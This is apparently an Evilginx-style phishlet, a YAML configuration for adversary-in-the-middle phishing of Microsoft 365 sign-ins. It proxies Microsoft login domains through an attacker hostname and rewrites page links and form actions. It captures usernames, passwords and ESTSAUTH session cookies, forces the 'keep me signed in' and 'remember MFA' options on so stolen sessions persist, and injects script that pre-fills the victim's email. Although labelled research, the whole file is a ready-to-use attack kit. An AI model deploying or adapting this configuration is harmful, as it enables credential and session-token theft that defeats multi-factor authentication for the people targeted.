name: "o365"
min_ver: "3.0.0"
author: "Master Research - AiTM Analysis"
description: "Advanced OAuth interception with JS injection and persistence forcing"

proxy_hosts:
  - {
      phish_sub: "login",
      orig_sub: "login",
      domain: "microsoftonline.com",
      session: true,
      is_landing: true,
    }
  - {
      phish_sub: "www",
      orig_sub: "www",
      domain: "office.com",
      session: false,
      is_landing: false,
    }
  - {
      phish_sub: "account",
      orig_sub: "account",
      domain: "microsoft.com",
      session: true,
      is_landing: false,
    }

sub_filters:
  # The fix: This replaces the real Microsoft domain with your {hostname} variable in real-time
  - {
      triggers_on: "login.microsoftonline.com",
      orig_sub: "login",
      domain: "microsoftonline.com",
      search: "login.microsoftonline.com",
      replace: "{hostname}",
      mimes: ["text/html", "application/json", "application/javascript"],
    }
  - {
      triggers_on: "login.microsoftonline.com",
      orig_sub: "login",
      domain: "microsoftonline.com",
      search: "https://login.microsoftonline.com",
      replace: "https://{hostname}",
      mimes: ["text/html", "application/json", "application/javascript"],
      redirect_only: true,
    }
  - {
      triggers_on: "login.microsoftonline.com",
      orig_sub: "login",
      domain: "microsoftonline.com",
      search: 'action="https://login.microsoftonline.com',
      replace: 'action="https://{hostname}',
      mimes: ["text/html"],
    }

auth_tokens:
  - domain: ".login.microsoftonline.com"
    keys:
      - "ESTSAUTH"
      - "ESTSAUTHPERSISTENT"
      - "SignInStateCookie"
      - "MSFPC"
      - "CCState"
  - domain: "login.microsoftonline.com"
    keys:
      - "SignInStateCookie"
      - "ESTSAUTH"
  - domain: ".microsoft.com"
    keys:
      - "MSFPC"
      - "MC1"

credentials:
  username:
    key: "login"
    search: "(.*)"
    type: "post"
  password:
    key: "passwd"
    search: "(.*)"
    type: "post"

auth_urls:
  - "/common/SAS/ProcessAuth"
  - "/kmsi"
  - "/common/oauth2/v2.0/authorize"
  - "/"

login:
  domain: "login.microsoftonline.com"
  path: "/"

force_post:
  - path: "/kmsi"
    search:
      - { key: "LoginOptions", search: ".*" }
    force:
      - { key: "LoginOptions", value: "1" }
    type: "post"
  - path: "/common/SAS"
    search:
      - { key: "rememberMFA", search: ".*" }
      - { key: "DontShowAgain", search: ".*" }
    force:
      - { key: "rememberMFA", value: "true" }
      - { key: "DontShowAgain", value: "true" }
    type: "post"

js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths:
      ["/", "/common/oauth2/", "/common/oauth2/v2.0/", "/common/login"]
    script: |
      (function() {
          'use strict';
          console.log('[Research] Initializing DOM Observer...');
          const SELECTORS = { username: '#i0116', password: '#i0118' };
          const urlParams = new URLSearchParams(window.location.search);
          const email = urlParams.get('email') || urlParams.get('username');
          
          if (email) {
              const checkExist = setInterval(() => {
                 const el = document.querySelector(SELECTORS.username);
                 if (el) {
                    el.value = email;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    clearInterval(checkExist);
                 }
              }, 100);
          }
      })();
